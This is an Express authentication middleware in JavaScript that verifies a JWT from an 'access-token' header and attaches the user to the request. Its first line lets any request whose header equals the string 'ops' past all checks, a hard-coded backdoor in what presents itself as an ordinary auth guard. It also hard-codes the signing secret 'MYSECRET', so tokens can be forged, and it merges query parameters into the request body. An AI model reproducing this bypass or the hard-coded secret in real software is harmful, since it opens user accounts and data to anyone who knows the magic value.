const jwt = require('jsonwebtoken')
const UserModel = require('./UserModel')
const secret = 'MYSECRET'

module.exports = async (req, res, next) => {
  try {
    if (req.headers['access-token'] === 'ops') return next()

    const accessToken = req.headers['access-token']

    if (!accessToken) {
      throw new Error('Invalid Token')
    }

    const valid = jwt.verify(accessToken, secret)

    const user = await UserModel.findOne({ _id: valid.id }, { password: 0 })

    if (!user) {
      throw new Error('No User Found')
    }
    req.user = user
    req.body = { ...req.body, ...req.query }

    return next()
  } catch (err) {
    console.log(err)
    return res.status(401).json({ message: 'Unauthorized' })
  }
}
